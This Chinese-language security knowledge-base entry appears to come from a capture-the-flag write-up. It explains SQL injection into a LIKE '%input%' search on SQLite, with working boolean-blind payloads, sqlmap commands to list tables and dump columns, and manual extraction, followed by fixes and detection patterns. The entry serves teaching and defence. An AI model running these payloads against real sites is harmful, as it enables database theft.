---
id: web-generic-sqli-like-pattern-closed-then-reopened-quote-payload
title: 搜索框 LIKE '%输入%' 的注入要“闭合再补回”：payload 末尾必须自己补上 %' 把模式串接回去，否则语法错、sqlmap 也跑不出来
type: scenario
domain: web
path: web/generic/sqli
technique: like-pattern-close-and-reopen-percent-quote-payload-shaping
tags:
- sqli
- like
- sqlite
- sqlmap
- boolean-blind
- payload-shaping
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W2
  verified_at: '2026-11-08T18:37:34+08:00'
  notes: '已对照原文核对；本次核对未读取图片；原句 select * from recipes where Ingredients like ''%$var%''、sqlmap -r 1.txt -p query --dbs --level 5、Payload: query=1%'' AND 8704=8704 AND ''LXpp%''=''LXpp、back-end DBMS: SQLite 只能 --tables、recipes 表 6 列含 flag 均与原文一致；「不加 --level 5 跑不出来」也按原文写入。闭合再补回后的还原式 like ''%1%'' AND 8704=8704 AND ''LXpp%''=''LXpp%'' 推导正确。未验证点：靶机已下线，sqlmap 未复跑'
url: /docs/web/generic/sqli/web-generic-sqli-like-pattern-closed-then-reopened-quote-payload/
draft: false
kb_aliases:
- LIKE 模式串闭合
- 通配符位置补回
- 末尾补引号与百分号
- sqlite 搜索框注入
- sqlmap --level 5 LIKE 注入
---

## 一句话结论

搜索框把输入拼进 `Ingredients like '%<输入>%'` 时，注入的难点不是单引号能不能闭合，而是闭合之后模式串还剩一段尾巴：只写 `' AND '1'='2' --` 会把后面的 `%'` 注释掉看似正常，但若注释被过滤、又不想依赖注释符，正确写法是把尾巴重新接回去——`1%' AND 8704=8704 AND 'LXpp%'='LXpp`，让整串还原成 `like '%1%' AND 8704=8704 AND 'LXpp%'='LXpp%'`。这样语法完全合法、布尔条件可控，sqlmap 才能识别出注入点（本例还需要 `--level 5`）。

## 原理

- **拼接后的完整形态**：代码是 `select * from recipes where Ingredients like '%$var%'`，`$var` 被两层包裹：前面 `'%`、后面 `%'`。攻击者能控制的是中间那段。
- **为什么不能只闭合**：写 `C'` 后整串变成 `like '%C'%'`，多出一个未配对的 `'`，数据库报语法错；写 `C' --` 靠注释吞掉尾巴，一旦 `--`/`#` 被拦或需要保留后半段条件就失效。
- **闭合再补回的构造**：`1%' AND 8704=8704 AND 'LXpp%'='LXpp` 代入后为
  `like '%1%' AND 8704=8704 AND 'LXpp%'='LXpp%'`
  第一个 `%` 补上了原来前导通配符之后的匹配位置，末尾的 `'LXpp%'='LXpp%'` 是一个恒真字符串比较，把原来尾巴上的 `%'` 用掉且不破坏语法。
- **为什么这样更可靠**：不依赖注释符、不依赖数据库方言；布尔条件放在两个合法字符串字面量之间，MySQL/SQLite/PostgreSQL 都能解析，便于判断“条件真/假时页面是否不同”。
- **为什么 sqlmap 要 `--level 5`**：注入点在引号包围的 LIKE 模式里，默认 level 下 sqlmap 的边界探测不会尝试“闭合后重建字符串”这类复杂边界，只有提高 level 才会枚举更多 boundary，进而识别出可注入。
- **SQLite 的枚举限制**：SQLite 没有 `information_schema`，`--dbs` 无效，只能 `--tables` 拿 `sqlite_master` 里的表名，再 `--columns`、`-C <列> --dump` 逐级取数据。

## 触发条件

- 搜索/过滤接口把用户输入拼进 `LIKE '%...%'`（未用参数绑定）。
- 单引号能进入 SQL 且未被转义；`--`/`#` 可能被过滤，需要不依赖注释的写法。
- 页面在“条件为真/为假”时响应有差异（结果条数、文案、长度、状态码）。

## 利用步骤

1. 先判闭合：输入 `C'` 看是否报错、`C"` 是否正常但无结果，确认是单引号包裹；再输入 `C' --` 看是否恢复——若恢复说明可用注释，若仍异常说明尾巴没处理干净。
2. 补回通配符：改成 `C%' --`，若返回与只搜 `C%` 相同结果，说明 `%` 位置对上了。
3. 换成不依赖注释的布尔构造：`1%' AND 8704=8704 AND 'LXpp%'='LXpp`，对比页面与 `AND 1=2` 版本的差异，确认布尔可控。
4. 抓包存成文件（保留 Cookie/方法/Content-Type），用 `sqlmap -r req.txt -p <参数名> --level 5` 跑；`--level 5` 是必须的，否则边界探测不到位会报“not injectable”。
5. 后端识别为 SQLite 时跳过 `--dbs`，直接 `--tables`；再 `-T <表> --columns`，最后 `-C <列> --dump` 取目标字段（本例 flag 就在 `recipes.flag`）。
6. 数据量小就不必等 sqlmap：用 `AND substr((select <列> from <表> limit 1),1,1)='a'` 一类条件手工二分，配合第 3 步的布尔构造即可逐字符取值。

## PoC

```text
原始拼接：select * from recipes where Ingredients like '%$var%'

# 1) 探闭合
var = C'                 -> 语法错误（尾巴多一个引号）
var = C"                 -> 正常但无结果
var = C' --              -> 若恢复，说明注释可用

# 2) 补回通配符
var = C%' --
var = 1%' AND 8704=8704 AND 'LXpp%'='LXpp
      还原为：like '%1%' AND 8704=8704 AND 'LXpp%'='LXpp%'
```

```bash
# 3) 交给 sqlmap（level 必须拉满，否则识别不到该边界）
sqlmap -r req.txt -p query --level 5
#     Type: boolean-based blind
#     Payload: query=1%' AND 8704=8704 AND 'LXpp%'='LXpp

# 4) SQLite 只能查表，不能查库
sqlmap -r req.txt -p query --level 5 --tables
sqlmap -r req.txt -p query --level 5 -T recipes --columns
sqlmap -r req.txt -p query --level 5 -T recipes -C flag --dump
```

## 变体与关联

- **不用 `AND 'a%'='a`**：也可用 `AND '%'='` 结束（把尾巴变成两个空匹配），或用 `AND 1=1 AND '%'='`；本质都是“让剩余片段自我闭合”。
- **注释可用时**：直接 `1%' AND 1=1 -- ` 更短，但 `--` 后必须带空格、部分驱动要求 `-- -`；被 WAF 拦时可退回补回写法。
- **数据库变体**：MySQL 可用 `#`，MSSQL 无注释需求时用 `AND 1=1 AND '%'='`；PostgreSQL 需注意 `LIKE` 与 `ILIKE`、`%` 在 `E''` 字符串中的转义。
- **关联**：[[web-generic-sqli-like-clause-append-search]]（同样 `LIKE '%...%'` 拼接，但走 `' OR 1=1#` 注释路线）、[[web-generic-sqli-sqlite-tags-timeblind-sqlmap-plaintext-password]]（SQLite + sqlmap 拖库）、[[web-generic-sqli-like-wildcard-metacharacter-data-exposure]]（不做注入、只滥用 `%`/`_` 通配符）。
- **边界**：输入被 `real_escape_string`/参数绑定处理时单引号失效；仅转义引号但保留 `%` 时退化为通配符滥用（见上）；布尔差异被缓存或统一错误页覆盖时改走时间盲注。

## 检测与防御

- **修复**：搜索条件用参数绑定（`WHERE Ingredients LIKE ?` 并传 `%value%`），不要拼字符串；同时对用户输入里的 `%`、`_` 做转义并声明 `ESCAPE`，避免通配符滥用。
- **加固**：数据库账号最小权限；错误页不回显 SQL；对搜索接口做参数类型/长度校验与频次限制。
- **检测（流量）**：`LIKE` 类参数中出现 `'`、`%'`、`AND 1=1`、`substr(`、`sqlite_master`、`information_schema`；同一参数短时间高频等长请求（盲注特征）；`--level 5` 类工具会留下大量边界探测请求，可按单 IP 请求数与响应码分布告警。
- **检测（代码）**：审计 `LIKE '%`、`whereLike`、`%${}`、`append(value)` 等拼接写法，标记值来自请求参数的 sink。
